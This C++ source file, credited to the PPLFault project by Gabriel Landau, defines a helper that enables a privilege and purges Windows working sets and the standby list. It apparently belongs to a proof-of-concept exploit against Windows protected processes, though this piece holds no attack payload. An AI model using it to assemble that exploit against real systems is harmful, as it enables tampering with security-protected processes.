// PPLFault by Gabriel Landau
// https://twitter.com/GabrielLandau

#include <iostream>
#include <ntstatus.h>
#define WIN32_NO_STATUS
#include <phnt_windows.h>
#include "MemoryCommand.h"
#include "Logging.h"

bool EmptySystemWorkingSet()
{
    NTSTATUS ntStatus = STATUS_SUCCESS;
    DWORD command = 0;
    BOOLEAN ignore = 0;

    // Enable SeProfileSingleProcessPrivilege which is required for SystemMemoryListInformation
    ntStatus = RtlAdjustPrivilege(SE_PROFILE_SINGLE_PROCESS_PRIVILEGE, TRUE, FALSE, &ignore);
    if (0 != ntStatus)
    {
        Log(Error, "Failed to enable SeProfileSingleProcessPrivilege with NTSTATUS 0x%08x", ntStatus);
        return false;
    }

    // Empty working sets
    command = MemoryEmptyWorkingSets;
    ntStatus = NtSetSystemInformation(SystemMemoryListInformation, &command, sizeof(command));
    if (0 != ntStatus)
    {
        Log(Error, "Failed to empty working sets with NTSTATUS 0x%08x", ntStatus);
        return false;
    }

    // Empty system standby list
    command = MemoryPurgeStandbyList;
    ntStatus = NtSetSystemInformation(SystemMemoryListInformation, &command, sizeof(command));
    if (0 != ntStatus)
    {
        Log(Error, "Failed to empty standby list with NTSTATUS 0x%08x", ntStatus);
        return false;
    }

    Log(Debug, "Working set purged");

    return true;
}
